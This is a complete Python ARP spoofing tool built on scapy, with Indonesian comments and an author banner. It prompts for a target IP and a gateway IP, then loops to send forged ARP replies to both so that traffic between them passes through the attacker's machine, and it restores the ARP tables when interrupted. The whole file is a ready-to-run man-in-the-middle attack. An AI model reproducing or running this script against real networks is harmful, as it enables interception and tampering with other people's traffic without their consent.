import scapy.all as scapy
import time



# Fungsi untuk mendapatkan alamat MAC dari suatu IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Fungsi untuk melakukan spoofing ARP, membuat target mengira bahwa kita adalah gateway, dan sebaliknya
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(
        op=2,  # 2 untuk opsi "response" agar target mengira ini adalah respons dari gateway
        pdst=target_ip,
        hwdst=get_mac(target_ip),
        psrc=spoof_ip
    )
    scapy.send(packet, verbose=False)

# Fungsi untuk mengembalikan settingan ARP asli setelah selesai spoofing
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,  # 2 untuk opsi "response" agar target mengira ini adalah respons dari gateway
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    scapy.send(packet, verbose=False)


print(r"""
    _______                          ______________       ________ 
___    |________________________ ___  /_____  /____  ____  __ \
__  /| |_  ___/  _ \_  __ \  __ `/_  /_  __  /__  / / /_  /_/ /
_  ___ |  /   /  __/  / / / /_/ /_  / / /_/ / _  /_/ /_  ____/ 
/_/  |_/_/    \___//_/ /_/\__,_/ /_/  \__,_/  _\__, / /_/      
                                              /____/""")
print("=====================================")
print("######    AUTHOR    #######")
print("*******    @RENALDY   ******")
print("=====================================")
print("\n\n\n")


# Input IP target dan gateway dari pengguna
ip_target = input("Masukan IP Target: ")
ip_gateway = input("Masukan Gateway IP: ")

# Assign IP target dan gateway
target_ip = ip_target
gateway_ip = ip_gateway

try:
    sent_packets = 0
    while True:
        # Melakukan spoofing
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets = sent_packets + 2
        print("\r [*] Packets Sent " + str(sent_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n Exiting.....")
    # Mengembalikan settingan ARP asli setelah selesai spoofing
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("\n Spoof Stopped.....")
